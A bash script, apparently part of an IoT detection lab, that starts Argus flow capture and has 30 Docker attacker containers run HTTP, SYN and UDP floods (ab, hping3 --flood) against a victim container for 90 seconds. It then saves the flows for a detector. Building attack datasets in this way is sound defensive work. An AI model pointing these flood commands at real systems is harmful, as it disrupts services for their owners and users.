#!/bin/bash

# Get victim IP
VICTIM_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' victim)
echo "Victim IP: $VICTIM_IP"

# Start Argus capture in background (using screen/tmux-like approach)
echo "Starting Argus capture..."
docker exec argus bash -c "cd / && rm -f flows.argus"
docker exec argus bash -c "argus -i eth0 -w /flows.argus &" &
ARGUS_PID=$!
sleep 5

# Verify Argus is running
if docker exec argus pgrep argus > /dev/null; then
    echo "Argus started successfully"
else
    echo "ERROR: Argus failed to start!"
    exit 1
fi

# Launch 30 attackers with MULTIPLE PROCESSES per container
echo "Launching 30 attackers with MULTI-PROCESS attack (3x intensity)..."
for i in {1..30}; do
  # Distribute attack types across attackers
  case $((i % 3)) in
    0)
      # HTTP Flood with 2 parallel instances
      echo "  Attacker $i: HTTP flood (2x processes)"
      docker exec -d iot-demo-attacker${i}-1 bash -c "ab -n 300000 -c 200 http://${VICTIM_IP}/ & ab -n 300000 -c 200 http://${VICTIM_IP}/" 2>/dev/null &
      ;;
    1)
      # SYN Flood with 3 parallel hping3 instances
      echo "  Attacker $i: SYN flood (3x processes)"
      docker exec -d iot-demo-attacker${i}-1 bash -c "hping3 -S -p 80 --flood ${VICTIM_IP} & hping3 -S -p 443 --flood ${VICTIM_IP} & hping3 -S -p 8080 --flood ${VICTIM_IP}" 2>/dev/null &
      ;;
    2)
      # UDP Flood with 3 parallel hping3 instances
      echo "  Attacker $i: UDP flood (3x processes)"
      docker exec -d iot-demo-attacker${i}-1 bash -c "hping3 --udp -p 53 --flood ${VICTIM_IP} & hping3 --udp -p 80 --flood ${VICTIM_IP} & hping3 --udp -p 123 --flood ${VICTIM_IP}" 2>/dev/null &
      ;;
  esac
done

echo "All attackers started, waiting 90 seconds for traffic accumulation..."
sleep 90

# Stop all attack processes
echo "Stopping all attack processes..."
for i in {1..30}; do
  docker exec iot-demo-attacker${i}-1 bash -c "pkill -9 ab; pkill -9 hping3" 2>/dev/null
done

# Stop Argus
echo "Stopping Argus..."
docker exec argus bash -c "pkill argus"
sleep 2

# Copy flows binary file
echo "Copying Argus binary file..."
docker cp argus:/flows.argus ./detector/flows.argus

# Generate flows_c (use ra with timestamp detail)
echo "Converting to flows_c.txt..."
docker exec argus bash -c "ra -r /flows.argus -n -s stime proto saddr daddr" > ./detector/flows_c.txt

# Generate flows_s (full flow summary)
echo "Converting to flows_s.txt..."
docker exec argus bash -c "ra -r /flows.argus -n" > ./detector/flows_s.txt

echo "Done! Check detector/flows_c.txt and flows_s.txt"
wc -l ./detector/flows_c.txt ./detector/flows_s.txt
